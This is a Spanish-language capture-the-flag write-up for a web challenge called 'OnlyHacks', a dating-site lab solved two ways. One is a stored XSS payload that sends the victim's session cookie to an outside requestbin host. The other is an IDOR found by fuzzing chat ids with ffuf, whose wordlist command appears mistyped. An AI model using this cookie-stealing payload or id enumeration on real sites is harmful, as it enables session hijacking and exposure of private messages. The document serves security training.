---
title: "OnlyHacks"
date: "2025-02-20T17:00:00-05:00"
draft: false
tags: ["Web", "Insecure Direct Object Reference (IDOR)", "XSS"]
---

Al ingresar a la url tenemos la opcion de registrarnos y logearnos que es lo primero que vamos a hacer.

<a href="https://imgur.com/XA5fCKn"><img src="https://i.imgur.com/XA5fCKn.png" title="source: imgur.com" /></a>

Dentro podremos ver una web de citas en la que la unica persona interesante es Renata ya que nos dice que siempre esta conectada, por lo que le vamos a dar match y vamos a hablar con ella.

<a href="https://imgur.com/SPZKCYs"><img src="https://i.imgur.com/SPZKCYs.png" title="source: imgur.com" /></a>

En este punto hay dos formas de resolver la maquina una es haciendo un Cross-Site-Scripting yla otra es modifcando la url ya que podemos ver que cada chat tiene un id.

Vamos a mostrar la primera si tratamos de usar un titulo html en la conversacion con renata este respondera al contenido:

```markdown
<h1>Hi</h1>
```

<a href="https://imgur.com/xZtJ9UZ"><img src="https://i.imgur.com/xZtJ9UZ.png" title="source: imgur.com" /></a>

Vamos a tratar de consegir la cookie de su sesion con el siguiente comando:

```markdown
<script>document.location='http://requestbin.whapi.cloud/19bdo3d1?
c='+document.cookie</script>
```

Vamos a ir a esta pagina [http://requestbin.whapi.cloud/](http://requestbin.whapi.cloud/) crearemos una nueva request y remplazaremos la url en el comando, si hace click en el link y recargamos la pagina de la request tendremos lo siguiente:

<a href="https://imgur.com/KL2LC4b"><img src="https://i.imgur.com/KL2LC4b.png" title="source: imgur.com" /></a>

Remplazaremos esa cookie en el navegador usando inspeccionar y podremos ver los chats de renata junto con la flag.

<a href="https://imgur.com/gF6SYzC"><img src="https://i.imgur.com/gF6SYzC.png" title="source: imgur.com" /></a>

Ahora vamos con la segunda forma

Cuando entramos al chat de renata podemos ver como la url es:

```markdown
http://94.237.55.96:37246/chat/?rid=6
```

Si cambiamos el valor del seis podremos ver otros chats hay una forma de probar esto de manera automatica con ffuf para verificar que sea un IDOR

```bash
#Creamos el diccionario
sed 1 100 > id.txt

ffuf -w id.txt -u 'http://94.237.55.96:37246/chat/?rid=FUZZ' -H "Cookie: session=TUCOOKIE" -mc 200
```

Esto nos devolvio dos posibles chats pero uno es el nuestro por lo que si probamos con el otro tendremos la flag.

<a href="https://imgur.com/EA0H2hP"><img src="https://i.imgur.com/EA0H2hP.png" title="source: imgur.com" /></a>
